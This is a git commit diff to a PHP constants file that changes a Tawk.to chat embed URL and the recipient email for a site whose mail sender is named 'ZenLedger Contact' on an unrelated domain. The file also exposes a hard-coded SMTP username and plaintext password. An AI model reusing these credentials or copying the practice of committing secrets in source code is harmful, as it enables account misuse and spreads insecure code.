eadf46690c6bbe2b37cc28d1a8cb20af6b35a4d5
vinay sachan <vinay@tappetbox.com>
2024-12-10 01:57:05 +0530

    changes

--- includes/constant.php
+++ includes/constant.php
@@ -1,12 +1,12 @@
 <?php
-define('TAWK_URL', 'https://embed.tawk.to/668d8729c3fb85929e3d5831/1i2cdfv5v');
+define('TAWK_URL', 'https://embed.tawk.to/675489894304e3196aee6aea/1ieh3iha3');
 define('CONST_MAIL_SERVER', 'smtpout.secureserver.net');
 define('CONST_MAIL_USERNAME', 'help@tavelssky.xyz');
 define('CONST_MAIL_PASSWORD', 'Help@me123');
 define('CONST_MAIL_FROM', 'help@tavelssky.xyz');
 define('CONST_MAIL_PORT', '465');
 define('CONST_MAIL_FROM_NAME', 'ZenLedger Contact');
-define('CONST_RECEIVE_EMAIL', 'gracebarrows8722@outlook.com');
+define('CONST_RECEIVE_EMAIL', 'sandra.wilson122001@gmail.com');
 //define('CONST_RECEIVE_EMAIL', 'vinaysachan@live.in');
 
 ?>
